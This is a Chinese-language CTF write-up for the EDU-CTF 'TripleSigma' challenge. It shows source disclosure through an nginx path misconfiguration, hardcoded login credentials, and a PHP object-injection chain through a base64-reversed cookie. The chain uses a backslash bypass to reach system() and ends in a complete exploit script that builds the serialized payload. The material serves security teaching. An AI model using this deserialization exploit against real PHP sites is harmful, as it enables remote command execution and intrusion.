# EDU-CTF TripleSigma题解

nginx配置出错 `/static../`读源码

`wget -r`递归下载下来

注册关闭
`login.php`
```php
<?php
    session_start();
    if(isset($_POST['user']) && isset($_POST['pass'])) {
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        if(User::check($user, $pass)) {
            $_SESSION['user'] = User::getIDByName($user);
	    $wrong = false;
            header("Location: index.php");
        } else {
            $wrong = true;
        }
    }
```
跟进`User::check`
```php
class User {

    public $func = "shell_exec";
    public $data = NULL;
    public static function getAllUser() {
        $users = array(array('id' => 1, 'name' => 'kaibro', 'password' => 'easypeasy666'));
        return $users;
    }
```
>用户名 kaibro
>密码 easypeasy666

登录进去后，有写文章功能
在源码`class_cookie.php`发现任意反序列化
```php
<?php

class MyCookie {
    public $uid = NULL;
    private $article = NULL;
    function __construct() {
        $enc = $_COOKIE['e'];
        $dec = base64_decode(strrev($enc));
        $arr = explode("|", $dec);      
        
	if($dec === NULL || $arr === NULL) {
	    johncena();
            die("500 Error");
        }

        if(count($arr) !== 3 && count($arr) !== 2) {
            // $dbg = new Debug($enc);
            // echo $dbg;
	    johncena();
            die("500 Error");
        }
                
        if(count($arr) === 2) {
            $this->uid = $arr[0];
            $obj = unserialize($arr[1]);
            $this->article = $obj;
        } else if(count($arr) === 3) {
            $this->uid = $arr[0];
            $title = $arr[1];
            $content = $arr[2];
            unset($_COOKIE['e']);
            $this->article = new Article($title, $content);
        } 
    }

    public function restore() {
        if($this->uid !== NULL && $this->article !== NULL)
            return $this->article; 
        else
            return NULL;
    }

    public static function save($title, $content) {
        $s = $_SESSION['user'] . "|" . $title . "|" . $content;
        $enc = strrev(base64_encode($s));
        setcookie("e", $enc, time()+3600);
    }

    public function __destruct() {
        $this->uid = NULL;
    }

}
```
寻找POP chain
`blog.php`
```php
    <?php
        if(isset($_COOKIE['e'])) {
            $myck = new MyCookie();
            $r = $myck->restore();
        } else {
	    $r = NULL;
	}
    ?>
    <?php if(isset($_SESSION['user'])): ?>
    <div class="art-form">
        <form method="post" id="article_form">
        <input type="text" name="title" class="in-title" maxlength="250" placeholder="title..." value="<?php print_title($r); ?>" >
            <br>
            <textarea form="article_form" name="content" maxlength="250" placeholder="content..."><?php print_content($r); ?></textarea>
            <br>
```
存在`$_COOKIE['e']`就实例化一个`MyCookie()`类，触发Debug里面的`__toString`
```php
//class_debug.php
    function __toString() {
        $str = "[DEUBG]" . $msg;
        $this->fm->save(); 
        return $str;
    }
```
跟进`save()`
```php
    public function save() {
        if(!isset($this->data))
            $this->data = User::getAllUser();

        if(preg_match("/^[a-z]/is", $this->func)) {
            if($this->func === "shell_exec") {
                ($this->func)("echo " . escapeshellarg($this->data) . " > /tmp/result");
            } 
        } else {
            ($this->func)($this->data);
        }

    }
```

用反斜杠绕过`preg_match("/^[a-z]/is", $this->func)`,执行else
构造`exp`
```php
<?php
include("lib/class_user.php");
include("lib/class_debug.php");
include("lib/class_cookie.php");
include("lib/class_filemanager.php");
include("lib/class_articlebody.php");
include("lib/class_article.php");

$title = new Debug();
$title->fm = new User();
$title->fm->func = "\\system";
$title->fm->data = "dir";
$content = "foo";
$body = new ArticleBody($title,$content);
$art = new Article("foo","bar");
$art->body = $body;
echo strrev(base64_encode("1|".serialize($art)));
```
放在源码根目录下执行一下就好了

